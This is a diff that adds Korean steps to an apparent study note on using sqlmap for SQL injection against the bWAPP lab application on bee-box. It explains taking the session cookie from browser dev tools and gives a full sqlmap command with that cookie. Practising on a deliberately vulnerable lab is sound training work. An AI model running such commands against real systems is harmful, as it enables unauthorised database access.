@@ -160,4 +160,31 @@ SQL 인젝션 후 웹 브라우저에서 데이터베이스에 저장된 users �
 </b></summary>
 <br>   
 
+**Step 1. 사용법**
+`sqlmap -u [SQL Injection 취약점이 존재하는 페이지의 주소] --cookie = [인증을 전제하는 경우에 SESSIONID가 포함된 쿠키값]`
+
+- 페이지 주소 : http://bee-box/bWAPP/sqli_1.php?title=man&action=search
+
+- cookie 값
+
+브라우저 개발도구(F12)의 Storage 확인
+![sqlmap1](https://user-images.githubusercontent.com/76420201/106384529-aa097b80-640e-11eb-91c2-17fa5d13baf7.gif)
+
+PHPSESSID = fc13d1925d717ec8ff2ec1f6e6182f34<br>
+security_level = 0
+
+---
+
+**Step 2. SQL Injection 공격 가능 여부 확인**
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo sqlmap -u "http://bee-box/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0"
+```
+
+<center><img src = "https://user-images.githubusercontent.com/76420201/106384672-6d8a4f80-640f-11eb-992a-3b0a7db2a87b.gif" width = "80%"></center>
+
+
+---
+
 </details>
